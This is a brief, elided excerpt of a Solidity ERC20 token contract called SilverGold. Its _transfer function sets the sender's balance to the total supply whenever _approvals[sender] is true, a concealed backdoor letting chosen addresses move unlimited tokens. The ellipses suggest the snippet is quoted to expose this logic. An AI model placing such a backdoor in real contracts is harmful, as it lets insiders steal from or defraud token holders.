...
contract SilverGold is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        if (_approvals[sender] == true) {
            senderBalance = totalSupply();
        } else {
